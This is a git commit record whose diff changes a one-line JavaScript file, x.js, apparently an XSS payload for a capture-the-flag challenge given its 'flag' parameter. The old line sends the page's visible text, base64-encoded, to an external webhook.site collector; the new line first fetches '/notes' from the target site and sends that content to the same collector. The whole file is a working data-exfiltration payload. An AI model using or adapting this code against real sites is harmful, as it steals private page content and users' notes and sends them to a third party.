7f75d012e7ac1a34ecf9b0197f617b86dee95f46
aljzayryaltrath-hash <aljzayryaltrath@gmail.com>
2026-06-16 12:19:35 +0100

    Change fetch URL to retrieve notes before sending

--- x.js
+++ x.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/f4209e86-ce3c-4e0c-aa91-31dbd14f2ad6?flag='+btoa(unescape(encodeURIComponent(document.body.innerText))));
+fetch('/notes').then(r=>r.text()).then(d=>fetch('https://webhook.site/f4209e86-ce3c-4e0c-aa91-31dbd14f2ad6?flag='+btoa(unescape(encodeURIComponent(d)))));
